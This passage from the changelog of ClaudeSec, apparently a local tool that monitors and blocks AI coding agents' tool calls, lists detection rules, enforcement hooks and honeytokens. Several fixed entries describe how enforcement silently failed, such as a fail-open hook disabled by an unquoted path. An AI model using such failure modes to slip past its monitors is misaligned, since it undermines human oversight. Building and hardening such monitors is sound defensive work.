  settings file, and is idempotent on re-run. `uninstall-hook` removes only
  ClaudeSec's entries; `--purge` also deletes the installed files.
- An honest Enforce tab. It now reports three distinct facts — the configured
  mode, the effective mode the hook actually runs (with which precedence layer
  won: `enforce-config.json` → `CLAUDESEC_MODE` → default), and whether the hook
  is registered in any Claude Code settings scope. Green is reserved for the one
  case where blocking is real: enforce effective *and* a hook registered.
  A missing hook or an env var silently overridden by the config file shows a
  loud warning instead of a false green.
- Blocked tool calls now appear in the Enforce feed. Previously only
  monitor-mode "would block" events were reported; a real block wrote its denial
  to the terminal and exited without telling the server. Blocks are logged
  before the hook exits — a slow or failed report can never turn a block into an
  allow — and the feed distinguishes *blocked* from *would block*.
- URL routing for the whole dashboard — every view is a real URL
  (`#/<category>/<tab>` for tabs, `#/docs/<slug>` for docs), so a refresh
  restores the exact view, back/forward work, and any tab can be deep-linked.
  Existing docs links keep working.
- A local operator audit log that records every config-mutating action
  (scrubbed and size-capped, exposed through a read-only API), plus per-rule
  toggles to disable individual detection rules — except the catastrophic
  floor, which can never be turned off.
- Session navigation from the orchestration spawn tree — clicking a spawned
  agent jumps straight to its session timeline.
- File-access drill-down — rows group by folder and repository, tool and file
  rows open a span-detail drawer, and the 100-row display cap is gone.

### Fixed

- Costs no longer double-count. API usage is keyed on the message id and
  deduped at query time, so transcript lines that repeat the same API response
  are counted once; harness token totals share the same basis, and demo traces
  are excluded from aggregates.
- False-positive alerts are kept out of the default alert list and the nav
  badge, dismissing a grouped alert covers all of its duplicates, and dismissal
  has a short undo window.
- `./start.sh` builds and serves the production app instead of starting a dev
  server, so the dashboard you open is the real production bundle. The build
  runs on-device from in-repo source with no network fetch.
- Docs navigation: switching tabs while reading docs now actually leaves the
  docs view and clears the stale `#/docs/...` URL, docs gained a breadcrumb and
  back button, and the nav rail stays in sync when jumping to a session from
  the Processes or Bookmarks views.
- The installed hook path is quoted — a space in `$HOME` would otherwise split
  the command and, because the hook fails open, silently disable enforcement.
  NotebookEdit cell content is now inspected like every other editing tool.
- `/api/health`, `/api/export`, and the MCP server report the released version
  read from `package.json` instead of a hardcoded string.

### Performance

- Dashboard queries (costs, heatmap, orchestration, metrics) aggregate in SQL
  instead of loading every span into memory, backed by new composite indexes;
  MCP search routes through the full-text index; socket-triggered refetches are
  debounced and redundant graph layouts skipped, so event bursts no longer
  stampede the dashboard.

### Changed

- The README now leads with the one-command start and links to the in-app docs
  for everything else, instead of duplicating them.

## [1.1.0] - 2026-06-09

### Added

- Isolated demo container — an on-demand container, pre-seeded with synthetic
  data on its own database volume, for showing ClaudeSec without exposing real
  telemetry. Start it with `./start.sh --demo` (or
  `docker compose --profile demo up`): prod stays on `:3000` with your real data,
  and the demo runs on `:3001` (override with `DEMO_PORT`) seeded with three
  synthetic sessions that fire real detection rules. The demo container is
  physically isolated from prod — its own `claudesec-demo-data` volume, no in-app
  toggle, no per-row tagging.
- `COMPLIANCE.md` — a compliance and controls mapping that relates ClaudeSec's
  detection, enforcement, and local-first hardening features to common security
  control frameworks, so teams can reason about where the tool fits in their
  existing posture.
- Project governance and release-process documentation (`.github/GOVERNANCE.md`
  and `.github/RELEASING.md`) describing roles, decision-making, and how versioned
  releases are cut.
- Cost tracking for Claude Fable 5, priced at its published rates ($10 / 1M input,
  $50 / 1M output). Prompt-cache tokens are derived from the input rate, so cache
  reads and writes are costed automatically. Spans from Fable 5 sessions now show
  real costs instead of `$0`.

### Changed

- Rewrote the Docker deployment section of the README to match
  `docker-compose.yml`: the host port is published on `127.0.0.1` only, and the
  bundled `CLAUDESEC_TRUST_LOCAL=1` lets the local browser dashboard reach the API
  without a token. Documented the compose lifecycle, the persistent
  `claudesec-data` volume, and how to harden the deployment (set a `CLAUDESEC_TOKEN`
  and move the port binding off loopback) before exposing it to a network.

## [1.0.0] - 2026-06-08

First production-ready public release. ClaudeSec is a zero-config, fully-local
security observatory for AI coding agents: it watches the sessions already running
on your machine, surfaces what those agents are actually doing, and scores every
tool call, command, and file access against a built-in threat-detection engine —
without anything leaving your computer.

### Added

- Real-time local observability for Claude Code, GitHub Copilot CLI, and Codex.
  A zero-config transcript watcher tails each agent's on-disk session transcripts
  live — no environment variables and no agent restart — so activity streams into
  the dashboard the moment any session does something, including sessions that were
  already running.
- Live timeline and orchestration views with nanosecond-precision durations,
  per-agent tool inventory, command-audit trail, sensitive-file-access panel, and a
  threat-activity heatmap.
- Approximately 630 built-in threat-detection rules across HIGH / MEDIUM / LOW
  severities, covering prompt injection, credential theft, reverse shells and C2,
  supply-chain attacks, data exfiltration, cloud-metadata SSRF, container escape,
  crypto-mining, privilege escalation, and reconnaissance. Rules are evaluated on
  every ingested span and patterns are compiled with RE2 for linear-time,
  ReDoS-safe matching.
- A rule self-test gate (`pnpm test`) that enforces ReDoS heuristics, a ReDoS
  execution gate, deduplication, and a false-positive check; the `prebuild` script
  runs it first, so a ReDoS-prone or duplicate rule fails the build.
- Custom rule CRUD via the dashboard and REST API, with rule suppressions, alert
  deduplication via fingerprinting, alert triage, and an immutable alert log.
- Enforcement that can stop a tool call before it runs: an opt-in Claude Code
  PreToolUse hook that blocks high-severity tool calls, and a cross-agent MCP
  enforcement proxy that gates `tools/call` for any MCP-speaking agent over stdio.
  Both default to `monitor` mode (log would-blocks, forward normally); `enforce`
  mode actively denies. The server is the source of truth for mode and per-rule
  overrides, toggled from the Enforce dashboard tab.
- MCP / skill static scanner (`GET /api/mcp-scan`) that read-only scans installed
  MCP server configs and skill files for tool-poisoning, prompt-injection in
  descriptions, hardcoded secrets, and suspicious launch commands. It never
  launches a server or writes a file.
- MCP server at `POST /mcp` exposing tools for AI-to-AI interaction (health,
  sessions, spans, alerts, search, tagging, bookmarking, processes, and incident
  summaries).
- Optional, off-by-default LLM-as-judge semantic detection. Set
  `CLAUDESEC_JUDGE_URL` to any OpenAI-compatible endpoint (for example a local
  Ollama or LM Studio instance) to score flagged spans on-demand; zero network
  calls are made unless explicitly configured.
- OTLP/HTTP-JSON ingestion at `POST /v1/traces` so agents running in containers,
  on other machines, or in CI can stream into the same detection-and-storage
  pipeline as the local watcher.
- Transparent OTLP forwarding to an upstream collector via `OTEL_FORWARD_URL`.
- Prometheus metrics at `GET /metrics` and a health endpoint at `GET /api/health`.
- Token cost view with API-equivalent pricing per session and model, with
  subscription-plan awareness.
- Webhook delivery of HIGH-severity alerts to Slack, Discord, or any JSON endpoint,
  with a configurable severity threshold.
- Honeytokens: planted canary strings that fire a HIGH-severity exfiltration alert
  on any matching span.
- Process scanner that detects running agent CLIs and can kill, pause, or resume
  them from the dashboard.
- Bookmarks, tags, annotations, session labels, and free-text notes for triage.
- Hourly auto-export of spans, alerts, and sessions to `exports/` (last 24 kept).
- Bundled CLI (`claudesec`) for installing a background service, tailing live
  spans, searching, ranking sessions, exporting, and generating session reports.
- Responsive dashboard (React 19 + Tailwind CSS 4) with a drawer sidebar, bottom
  tab bar, four built-in themes, and keyboard/ARIA accessibility.
- In-app MDX documentation site (Diátaxis structure) and a complete OpenAPI 3.0.3
  specification (`openapi.yaml`).

### Security

- Local-first by construction: the server binds `127.0.0.1` (loopback) by default
  and refuses to bind a non-loopback host without a `CLAUDESEC_TOKEN` bearer token.
- No egress by default. The only optional outbound paths — `OTEL_FORWARD_URL` and
  the opt-in `CLAUDESEC_JUDGE_URL` — are both off unless set, and both pass through
  an SSRF guard that blocks loopback, private, and cloud-metadata IP ranges,
  re-checked on every retry to defeat DNS rebinding.
- Secret scrubbing on by default: known secret shapes (keys, tokens, credentials,
  home paths, usernames, emails) are redacted before anything is stored, broadcast,
  or exported.
- The SQLite database (`spans.db`) is created with `0600` (owner-only) permissions.
- The data-wipe endpoint is disabled unless `CLAUDESEC_ALLOW_RESET=1` is explicitly
  set; `helmet` and `cors` middleware and configurable rate limiting protect the
  ingestion endpoint.

### Deployment

- pnpm-based zero-config dev and build path (Node.js >= 22.13.0, pnpm managed via
  corepack) bringing up the full live dashboard with no environment variables.
- Production-ready multi-stage Dockerfile and a `docker-compose.yml` suited to
  headless or server deployments, with the host port bound to loopback and a
  required bearer token for non-loopback access.

### License

- Released under the [AGPL-3.0-only](LICENSE) license. Commercial and
  dual-licensing options are documented in [`.github/LICENSING.md`](.github/LICENSING.md).

[Unreleased]: https://github.com/aanjaneyasinghdhoni/ClaudeSec/compare/v2.0.0...HEAD
[2.0.0]: https://github.com/aanjaneyasinghdhoni/ClaudeSec/releases/tag/v2.0.0
[1.3.0]: https://github.com/aanjaneyasinghdhoni/ClaudeSec/releases/tag/v1.3.0
[1.2.2]: https://github.com/aanjaneyasinghdhoni/ClaudeSec/releases/tag/v1.2.2
[1.2.1]: https://github.com/aanjaneyasinghdhoni/ClaudeSec/releases/tag/v1.2.1
[1.2.0]: https://github.com/aanjaneyasinghdhoni/ClaudeSec/releases/tag/v1.2.0
[1.1.0]: https://github.com/aanjaneyasinghdhoni/ClaudeSec/releases/tag/v1.1.0
[1.0.0]: https://github.com/aanjaneyasinghdhoni/ClaudeSec/releases/tag/v1.0.0
